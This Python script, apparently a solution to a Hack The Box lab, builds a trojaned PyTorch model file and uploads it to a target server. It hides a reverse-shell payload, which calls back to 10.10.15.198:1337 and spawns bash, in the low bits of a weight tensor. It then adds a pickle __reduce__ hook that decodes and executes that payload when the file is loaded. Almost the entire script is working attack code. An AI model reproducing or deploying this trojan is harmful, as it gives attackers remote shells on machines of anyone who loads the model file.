import torch
import torch.nn as nn
import torch.optim as optim
from torch.utils.data import TensorDataset, DataLoader
import numpy as np
import os
import requests

# Step 1: Create dummy model

# Seed for reproducibility
SEED = 1337
np.random.seed(SEED)
torch.manual_seed(SEED)


# Define a simple Neural Network
class SimpleNet(nn.Module):
    def __init__(self, input_size, hidden_size, output_size):
        super(SimpleNet, self).__init__()
        self.fc1 = nn.Linear(input_size, hidden_size)
        self.relu = nn.ReLU()
        self.fc2 = nn.Linear(hidden_size, output_size)
        # Add a larger layer potentially suitable for steganography later
        self.large_layer = nn.Linear(hidden_size, hidden_size * 5)

    def forward(self, x):
        x = self.fc1(x)
        x = self.relu(x)
        x = self.fc2(x)
        # Note: large_layer is defined but not used in forward pass for simplicity
        # In a real model, all layers would typically be used.
        return x


# Model parameters
input_dim = 10
hidden_dim = 128  # Increased hidden size for larger layers
output_dim = 1
target_model = SimpleNet(input_dim, hidden_dim, output_dim)


print("SimpleNet model structure:")
print(target_model)
print("\nModel parameters (state_dict keys and initial values):")
for name, param in target_model.state_dict().items():
    print(f"  {name}: shape={param.shape}, numel={param.numel()}, dtype={param.dtype}")
    if param.numel() > 0:
        print(f"    Initial values (first 3): {param.flatten()[:3].tolist()}")


# Generate dummy data
num_samples = 100
X_train = torch.randn(num_samples, input_dim)
true_weights = torch.randn(input_dim, output_dim)
y_train = X_train @ true_weights + torch.randn(num_samples, output_dim) * 0.5

# Prepare DataLoader
dataset = TensorDataset(X_train, y_train)
dataloader = DataLoader(dataset, batch_size=16)

# Loss and optimizer
criterion = nn.MSELoss()
optimizer = optim.Adam(target_model.parameters(), lr=0.01)

# Simple training loop
num_epochs = 5 # Minimal training
print(f"\n'Training' the model for {num_epochs} epochs...")
target_model.train() # Set model to training mode
for epoch in range(num_epochs):
    epoch_loss = 0.0
    for inputs, targets in dataloader:
        optimizer.zero_grad()
        outputs = target_model(inputs)
        loss = criterion(outputs, targets)
        loss.backward()
        optimizer.step()
        epoch_loss += loss.item()
    print(f"  Epoch [{epoch+1}/{num_epochs}], Loss: {epoch_loss/len(dataloader):.4f}")

print("Training complete.")


legitimate_state_dict_file = "target_model.pth"

try:
    # Save the model's state dictionary. torch.save uses pickle internally.
    torch.save(target_model.state_dict(), legitimate_state_dict_file)
    print(f"\nLegitimate model state_dict saved to '{legitimate_state_dict_file}'.")
except Exception as e:
    print(f"\nError saving legitimate state_dict: {e}")



# Step 2: Define Steganography Tools
import struct

def encode_lsb(
    tensor_orig: torch.Tensor, data_bytes: bytes, num_lsb: int
) -> torch.Tensor:
    """Encodes byte data into the LSBs of a float32 tensor (prepends length).

    Args:
        tensor_orig: The original float32 tensor.
        data_bytes: The byte string to encode.
        num_lsb: The number of least significant bits (1-8) to use per float.

    Returns:
        A new tensor with the data embedded in its LSBs.

    Raises:
        TypeError: If tensor_orig is not a float32 tensor.
        ValueError: If num_lsb is not between 1 and 8.
        ValueError: If the tensor does not have enough capacity for the data.
    """
    if tensor_orig.dtype != torch.float32:
        raise TypeError("Tensor must be float32.")
    if not 1 <= num_lsb <= 8:
        raise ValueError("num_lsb must be 1-8. More bits increase distortion.")

    tensor = tensor_orig.clone().detach() # Work on a copy

    n_elements = tensor.numel()
    tensor_flat = tensor.flatten() # Flatten for easier iteration

    data_len = len(data_bytes)
    # Prepend the length of the data as a 4-byte unsigned integer (big-endian)
    data_to_embed = struct.pack(">I", data_len) + data_bytes

    total_bits_needed = len(data_to_embed) * 8
    capacity_bits = n_elements * num_lsb

    if total_bits_needed > capacity_bits:
        raise ValueError(
            f"Tensor too small: needs {total_bits_needed} bits, but capacity is {capacity_bits} bits. "
            f"Required elements: { (total_bits_needed + num_lsb -1) // num_lsb}, available: {n_elements}."
        )

    data_iter = iter(data_to_embed)  # To get bytes one by one
    current_byte = next(data_iter, None)  # Load the first byte
    bit_index_in_byte = 7  # Start from the MSB of the current_byte
    element_index = 0  # Index for tensor_flat
    bits_embedded = 0  # Counter for total bits embedded

    while bits_embedded < total_bits_needed and element_index < n_elements:
        if current_byte is None:  # Should not happen if capacity check is correct
            break

        original_float = tensor_flat[element_index].item()
        # Convert float to its 32-bit integer representation
        packed_float = struct.pack(">f", original_float)
        int_representation = struct.unpack(">I", packed_float)[0]

        # Create a mask for the LSBs we want to modify
        mask = (1 << num_lsb) - 1
        data_bits_for_float = 0  # Accumulator for bits to embed in this float

        for i in range(num_lsb):  # For each LSB position in this float
            if current_byte is None:  # No more data bytes
                break
            
            data_bit = (current_byte >> bit_index_in_byte) & 1
            data_bits_for_float |= data_bit << (num_lsb - 1 - i)
            
            bit_index_in_byte -= 1
            if bit_index_in_byte < 0:  # Current byte fully processed
                current_byte = next(data_iter, None) # Get next byte
                bit_index_in_byte = 7  # Reset bit index

            bits_embedded += 1
            if bits_embedded >= total_bits_needed:  # All data embedded
                break

        # Clear the LSBs of the original float's integer representation
        cleared_int = int_representation & (~mask)
        # Combine the cleared integer with the data bits
        new_int_representation = cleared_int | data_bits_for_float
    
        # Convert the new integer representation back to a float
        new_packed_float = struct.pack(">I", new_int_representation)
        new_float = struct.unpack(">f", new_packed_float)[0]
    
        tensor_flat[element_index] = new_float  # Update the tensor
        element_index += 1

    print(f"Encoded {bits_embedded} bits into {element_index} elements using {num_lsb} LSB(s) per element.")
    return tensor


def decode_lsb(tensor_modified: torch.Tensor, num_lsb: int) -> bytes:
    """Decodes byte data hidden in the LSBs of a float32 tensor.
    Assumes data was encoded with encode_lsb (length prepended).

    Args:
        tensor_modified: The float32 tensor containing the hidden data.
        num_lsb: The number of LSBs (1-8) used per float during encoding.

    Returns:
        The decoded byte string.

    Raises:
        TypeError: If tensor_modified is not a float32 tensor.
        ValueError: If num_lsb is not between 1 and 8.
        ValueError: If tensor ends prematurely during decoding or length/payload mismatch.
    """
    if tensor_modified.dtype != torch.float32:
        raise TypeError("Tensor must be float32.")
    if not 1 <= num_lsb <= 8:
        raise ValueError("num_lsb must be 1-8.")

    tensor_flat = tensor_modified.flatten()
    n_elements = tensor_flat.numel()
    shared_state = {'element_index': 0}

    def get_bits(count: int) -> list[int]:
        nonlocal shared_state 
        bits = []
        
        while len(bits) < count and shared_state['element_index'] < n_elements:
            current_float = tensor_flat[shared_state['element_index']].item()
            packed_float = struct.pack(">f", current_float)
            int_representation = struct.unpack(">I", packed_float)[0]

            mask = (1 << num_lsb) - 1
            lsb_data = int_representation & mask 

            for i in range(num_lsb):
                bit = (lsb_data >> (num_lsb - 1 - i)) & 1
                bits.append(bit)
                if len(bits) == count: 
                    break
            
            shared_state['element_index'] += 1 

        if len(bits) < count:
            raise ValueError(
                f"Tensor ended prematurely. Requested {count} bits, got {len(bits)}. "
                f"Processed {shared_state['element_index']} elements."
            )
        return bits
    
    try:
        length_bits = get_bits(32)  # Decode the 32-bit length prefix
    except ValueError as e:
        raise ValueError(f"Failed to decode payload length: {e}")

    payload_len_bytes = 0
    for bit in length_bits:
        payload_len_bytes = (payload_len_bytes << 1) | bit

    if payload_len_bytes == 0:
        print(f"Decoded length is 0. Returning empty bytes. Processed {shared_state['element_index']} elements for length.")
        return b""  # No payload if length is zero

    try:
        payload_bits = get_bits(payload_len_bytes * 8)  # Decode the actual payload
    except ValueError as e:
        raise ValueError(f"Failed to decode payload (length: {payload_len_bytes} bytes): {e}")

    decoded_bytes = bytearray()
    current_byte_val = 0
    bit_count = 0

    for bit in payload_bits:
        current_byte_val = (current_byte_val << 1) | bit
        bit_count += 1
        if bit_count == 8:  # A full byte has been assembled
            decoded_bytes.append(current_byte_val)
            current_byte_val = 0  # Reset for the next byte
            bit_count = 0  # Reset bit counter

    print(f"Decoded {len(decoded_bytes)} bytes. Used {shared_state['element_index']} tensor elements with {num_lsb} LSB(s) per element.")
    return bytes(decoded_bytes)


# Step 3: Create a payload
import socket, subprocess, os, pty, sys, traceback  # Imports needed by payload

# Configure connection details for the reverse shell
# Use the IP/DNS name of the machine running the listener, accessible FROM your target instance,
HOST_IP = "10.10.15.198"  # THIS IS YOUR IP WHEN ON THE HTB NETWORK
LISTENER_PORT = 1337  # The port that you will listen for a connection on

print(f"--- Payload Configuration ---")
print(f"Payload will target: {HOST_IP}:{LISTENER_PORT}")
print(f"-----------------------------")

# The payload string itself
payload_code_string = f"""
import socket, subprocess, os, pty, sys, traceback
print("[PAYLOAD] Payload starting execution.", file=sys.stderr); sys.stderr.flush()
attacker_ip = '{HOST_IP}'; attacker_port = {LISTENER_PORT}
print(f"[PAYLOAD] Attempting connection to {{attacker_ip}}:{{attacker_port}}...", file=sys.stderr); sys.stderr.flush()
s = None
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(5.0)
    s.connect((attacker_ip, attacker_port)); s.settimeout(None)
    print("[PAYLOAD] Connection successful.", file=sys.stderr); sys.stderr.flush()
    print("[PAYLOAD] Redirecting stdio...", file=sys.stderr); sys.stderr.flush()
    os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
    shell = os.environ.get('SHELL', '/bin/bash')
    print(f"[PAYLOAD] Spawning shell: {{shell}}", file=sys.stderr); sys.stderr.flush() # May not be seen
    pty.spawn([shell]) # Start interactive shell
except socket.timeout: print(f"[PAYLOAD] ERROR: Connection timed out.", file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
except ConnectionRefusedError: print(f"[PAYLOAD] ERROR: Connection refused.", file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
except Exception as e: print(f"[PAYLOAD] ERROR: Unexpected error: {{e}}", file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
finally:
    print("[PAYLOAD] Payload script finishing.", file=sys.stderr); sys.stderr.flush()
    if s:
        try: s.close()
        except: pass
    os._exit(1) # Force exit
"""

# Encode payload for steganography
payload_bytes_to_hide = payload_code_string.encode("utf-8")
print(f"Payload defined and encoded to {len(payload_bytes_to_hide)} bytes.")


# Step 4: Hide payload in dummy model
NUM_LSB = 2    # Number of LSBs to use

# Load the legitimate state dict
# legitimate_state_dict_file = "victim_model_state.pth"
if not os.path.exists(legitimate_state_dict_file):
    raise FileNotFoundError(
        f"Legitimate state dict '{legitimate_state_dict_file}' not found."
    )

print(f"\nLoading legitimate state dict from '{legitimate_state_dict_file}'...")
loaded_state_dict = torch.load(legitimate_state_dict_file)  # Load the dictionary
print("State dict loaded successfully.")


# Choose a target layer/tensor for embedding
target_key = "large_layer.weight"
if target_key not in loaded_state_dict:
    raise KeyError(
        f"Target key '{target_key}' not found in state dict. Available keys: {list(loaded_state_dict.keys())}"
    )

original_target_tensor = loaded_state_dict[target_key]
print(
    f"Selected target tensor '{target_key}' with shape {original_target_tensor.shape} and {original_target_tensor.numel()} elements."
)

# Ensure the payload isn't too large for the chosen tensor
bytes_to_embed = 4 + len(payload_bytes_to_hide)  # 4 bytes for length prefix
bits_needed = bytes_to_embed * 8
elements_needed = (bits_needed + NUM_LSB - 1) // NUM_LSB  # Ceiling division
print(f"Payload requires {elements_needed} elements using {NUM_LSB} LSBs.")

if original_target_tensor.numel() < elements_needed:
    raise ValueError(f"Target tensor '{target_key}' is too small for the payload!")


# Encode the payload into the target tensor
print(f"\nEncoding payload into tensor '{target_key}'...")
try:
    modified_target_tensor = encode_lsb(
        original_target_tensor, payload_bytes_to_hide, NUM_LSB
    )
    print("Encoding complete.")

    # Replace the original tensor with the modified one in the dictionary
    modified_state_dict = (
        loaded_state_dict.copy()
    )  # Don't modify the original loaded dict directly
    modified_state_dict[target_key] = modified_target_tensor
    print(f"Replaced '{target_key}' in state dict with modified tensor.")

except Exception as e:
    print(f"Error during encoding or state dict modification: {e}")
    raise  # Re-raise the exception

import pickle
import traceback
import subprocess


class TrojanModelWrapper:
    """
    A malicious wrapper class designed to act as a Trojan.
    """

    def __init__(self, modified_state_dict: dict, target_key: str, num_lsb: int):
        """
        Initializes the wrapper, pickling the state_dict for embedding.
        """
        print(
            f"  [Wrapper Init] Received modified state_dict with {len(modified_state_dict)} keys."
        )
        print(f"  [Wrapper Init] Received target_key: '{target_key}'")
        print(f"  [Wrapper Init] Received num_lsb: {num_lsb}")

        if target_key not in modified_state_dict:
            raise ValueError(
                f"target_key '{target_key}' not found in the provided state_dict."
            )
        if not isinstance(modified_state_dict[target_key], torch.Tensor):
            raise TypeError(f"Value at target_key '{target_key}' is not a Tensor.")
        if modified_state_dict[target_key].dtype != torch.float32:
            raise TypeError(f"Tensor at target_key '{target_key}' is not float32.")
        if not 1 <= num_lsb <= 8:
            raise ValueError("num_lsb must be between 1 and 8.")

        try:
            self.pickled_state_dict_bytes = pickle.dumps(modified_state_dict)
            print(
                f"  [Wrapper Init] Successfully pickled state_dict for embedding ({len(self.pickled_state_dict_bytes)} bytes)."
            )
        except Exception as e:
            print(f"--- Error pickling state_dict ---")
            print(f"Error: {e}")
            raise RuntimeError(
                "Failed to pickle state_dict for embedding in wrapper."
            ) from e

        self.target_key = target_key
        self.num_lsb = num_lsb
        print(
            "  [Wrapper Init] Initialization complete. Wrapper is ready to be pickled."
        )

    def get_state_dict(self):
        try:
            return pickle.loads(self.pickled_state_dict_bytes)
        except Exception as e:
            print(f"Error deserializing internal state_dict: {e}")
            return None

    def __reduce__(self):
        """
        Exploits pickle deserialization to execute embedded loader code.
        """
        print(
            "\n[!] TrojanModelWrapper.__reduce__ activated (likely during pickling/saving process)!"
        )
        print("    Preparing loader code string...")

        # Embed the decode_lsb function source code.
        decode_lsb_source = """
import torch, struct, pickle, traceback
def decode_lsb(tensor_modified: torch.Tensor, num_lsb: int) -> bytes:
    if tensor_modified.dtype != torch.float32: raise TypeError("Tensor must be float32.")
    if not 1 <= num_lsb <= 8: raise ValueError("num_lsb must be 1-8.")
    tensor_flat = tensor_modified.flatten(); n_elements = tensor_flat.numel(); element_index = 0
    def get_bits(count: int) -> list[int]:
        nonlocal element_index; bits = []
        while len(bits) < count:
            if element_index >= n_elements: raise ValueError(f"Tensor ended prematurely trying to read {count} bits.")
            current_float = tensor_flat[element_index].item();
            try: packed_float = struct.pack('>f', current_float); int_representation = struct.unpack('>I', packed_float)[0]
            except struct.error: element_index += 1; continue
            mask = (1 << num_lsb) - 1; lsb_data = int_representation & mask
            for i in range(num_lsb):
                bit = (lsb_data >> (num_lsb - 1 - i)) & 1; bits.append(bit)
                if len(bits) == count: break
            element_index += 1
        return bits
    try:
        length_bits = get_bits(32); length_int = 0
        for bit in length_bits: length_int = (length_int << 1) | bit
        payload_len_bytes = length_int
        if payload_len_bytes == 0: return b''
        if payload_len_bytes < 0: raise ValueError(f"Decoded negative length: {payload_len_bytes}")
        payload_bits = get_bits(payload_len_bytes * 8)
        decoded_bytes = bytearray(); current_byte_val = 0; bit_count = 0
        for bit in payload_bits:
            current_byte_val = (current_byte_val << 1) | bit; bit_count += 1
            if bit_count == 8: decoded_bytes.append(current_byte_val); current_byte_val = 0; bit_count = 0
        return bytes(decoded_bytes)
    except ValueError as e: raise ValueError(f"Embedded LSB Decode failed: {e}") from e
    except Exception as e_inner: raise RuntimeError(f"Unexpected Embedded LSB Decode error: {e_inner}") from e_inner
"""

        # Embed necessary data
        pickled_state_dict_literal = repr(self.pickled_state_dict_bytes)
        embedded_target_key = repr(self.target_key)
        embedded_num_lsb = self.num_lsb
        print(
            f"  [Reduce] Embedding {len(self.pickled_state_dict_bytes)} bytes of pickled state_dict."
        )

        # Construct the loader code string
        loader_code = f"""
import pickle, torch, struct, traceback, os, pty, socket, sys, subprocess
print('[+] Trojan Wrapper: Loader code execution started.', file=sys.stderr); sys.stderr.flush()
{decode_lsb_source}
print('[+] Trojan Wrapper: Embedded decode_lsb function defined.', file=sys.stderr); sys.stderr.flush()
pickled_state_dict_bytes = {pickled_state_dict_literal}
target_key = {embedded_target_key}
num_lsb = {embedded_num_lsb}
print(f'[+] Trojan Wrapper: Embedded data retrieved (state_dict size={{len(pickled_state_dict_bytes)}}, target_key={{target_key!r}}, num_lsb={{num_lsb}}).', file=sys.stderr); sys.stderr.flush()
try:
    print('[+] Trojan Wrapper: Deserializing embedded state_dict...', file=sys.stderr); sys.stderr.flush()
    reconstructed_state_dict = pickle.loads(pickled_state_dict_bytes)
    if not isinstance(reconstructed_state_dict, dict):
        raise TypeError("Deserialized object is not a dictionary (state_dict).")
    print(f'[+] Trojan Wrapper: State_dict reconstructed successfully ({{len(reconstructed_state_dict)}} keys).', file=sys.stderr); sys.stderr.flush()
    if target_key not in reconstructed_state_dict:
        raise KeyError(f"Target key '{{target_key}}' not found in reconstructed state_dict.")
    payload_tensor = reconstructed_state_dict[target_key]
    if not isinstance(payload_tensor, torch.Tensor):
         raise TypeError(f"Value for key '{{target_key}}' is not a Tensor.")
    print(f'[+] Trojan Wrapper: Located payload tensor (key={{target_key!r}}, shape={{payload_tensor.shape}}).', file=sys.stderr); sys.stderr.flush()
    print(f'[+] Trojan Wrapper: Decoding hidden payload from tensor using {{num_lsb}} LSBs...', file=sys.stderr); sys.stderr.flush()
    extracted_payload_bytes = decode_lsb(payload_tensor, num_lsb)
    print(f'[+] Trojan Wrapper: Payload decoded successfully ({{len(extracted_payload_bytes)}} bytes).', file=sys.stderr); sys.stderr.flush()
    extracted_payload_code = extracted_payload_bytes.decode('utf-8', errors='replace')
    print('[!] Trojan Wrapper: Executing final decoded payload (reverse shell)...', file=sys.stderr); sys.stderr.flush()
    exec(extracted_payload_code, globals(), locals())
    print('[!] Trojan Wrapper: Payload execution initiated.', file=sys.stderr); sys.stderr.flush()

except Exception as e:
    print(f'[!!!] Trojan Wrapper: FATAL ERROR during loader execution: {{e}}', file=sys.stderr);
    traceback.print_exc(file=sys.stderr); sys.stderr.flush()
finally:
    print('[+] Trojan Wrapper: Loader code sequence finished.', file=sys.stderr); sys.stderr.flush()
"""
        print("  [Reduce] Loader code string constructed with escaped inner braces.")
        print("  [Reduce] Returning (exec, (loader_code,)) tuple to pickle.")
        return (exec, (loader_code,))


print("TrojanModelWrapper class defined.")


# Ensure the modified state dict exists from the embedding step
if "modified_state_dict" not in locals() or not isinstance(modified_state_dict, dict):
    raise NameError(
        "Critical Error: 'modified_state_dict' not found or invalid. Cannot create wrapper."
    )
# Ensure the target key used for embedding is correctly defined
if "target_key" not in locals():
    raise NameError(
        "Critical Error: 'target_key' variable not defined. Cannot create wrapper."
    )

print(f"\n--- Instantiating TrojanModelWrapper ---")
try:
    # Create an instance of our wrapper class.
    # Pass the entire modified state dictionary, the key identifying the
    # payload tensor within that dictionary, and the LSB count.
    # The wrapper's __init__ pickles the state_dict internally.
    wrapper_instance = TrojanModelWrapper(
        modified_state_dict=modified_state_dict,
        target_key=target_key,
        num_lsb=NUM_LSB,
    )
    print("TrojanModelWrapper instance created successfully.")
    print(
        "The wrapper instance now internally holds the pickled bytes of the entire modified state_dict."
    )

except Exception as e:
    print(f"\n--- Error Instantiating Wrapper ---")
    print(f"Error: {e}")
    raise SystemExit("Failed to instantiate TrojanModelWrapper.") from e

#Step 5: Save new model with attached payload
# Define the filename for our final malicious artifact
final_malicious_file = "malicious_trojan_model.pth"

print(f"\n--- Saving the Trojan Wrapper Instance to '{final_malicious_file}' ---")
try:
    torch.save(wrapper_instance, final_malicious_file)
    print(
        f"Final malicious Trojan file saved successfully to '{final_malicious_file}'."
    )
    print(f"File size: {os.path.getsize(final_malicious_file)} bytes.")

except Exception as e:
    # Catch potential errors during the final save operation
    print(f"\n--- Error Saving Final Malicious File ---")
    import traceback

    traceback.print_exc()
    print(f"Error details: {e}")
    raise SystemExit("Failed to save the final malicious wrapper file.") from e

# Step 6: Send malicious model to target
api_url = "http://ip:5555/upload"  # Replace with instance details

pickle_file_path = final_malicious_file

print(f"Attempting to upload '{pickle_file_path}' to '{api_url}'...")

# Check if the malicious pickle file exists locally
if not os.path.exists(pickle_file_path):
    print(f"\nError: File not found at '{pickle_file_path}'.")
    print("Please ensure the file exists in the specified path.")
else:
    print(f"File found at '{pickle_file_path}'. Preparing upload...")
    # Prepare the file for upload in the format requests expects
    # The key 'model' must match the key expected by the Flask app (request.files['model'])
    files_to_upload = {
        "model": (
            os.path.basename(pickle_file_path),
            open(pickle_file_path, "rb"),
            "application/octet-stream",
        )
    }

    try:
        # Send the POST request with the file
        print("Sending POST request...")
        response = requests.post(api_url, files=files_to_upload)

        # Print the server's response details
        print("\n--- Server Response ---")
        print(f"Status Code: {response.status_code}")
        try:
            # Try to print JSON response if available
            print("Response JSON:")
            print(response.json())
        except requests.exceptions.JSONDecodeError:
            # Otherwise, print raw text response
            print("Response Text:")
            print(response.text)
        print("--- End Server Response ---")

        if response.status_code == 200:
            print(
                "\nUpload successful (HTTP 200). Check your listener for a connection."
            )
        else:
            print(
                f"\nUpload failed or server encountered an error (Status code: {response.status_code})."
            )

    except requests.exceptions.ConnectionError as e:
        print(f"\n--- Connection Error ---")
        print(f"Could not connect to the server at '{api_url}'.")
        print("Please ensure:")
        print("  1. The API URL is correct.")
        print("  2. Your target instance is running and the port is mapped correctly.")
        print("  3. There are no network issues (e.g., firewall).")
        print("  4. You have a listener running for the connection.")
        print(f"Error details: {e}")
        print("--- End Connection Error ---")

    except Exception as e:
        print(f"\n--- An unexpected error occurred during upload ---")
        traceback.print_exc()
        print(f"Error details: {e}")
        print("--- End Unexpected Error ---")

    finally:
        # Ensure the file handle opened for upload is closed
        if "files_to_upload" in locals() and "model" in files_to_upload:
            try:
                files_to_upload["model"][1].close()
                # print("Closed file handle for upload.")
            except Exception as e_close:
                print(f"Warning: Error closing file handle: {e_close}")

print("\nUpload script finished.")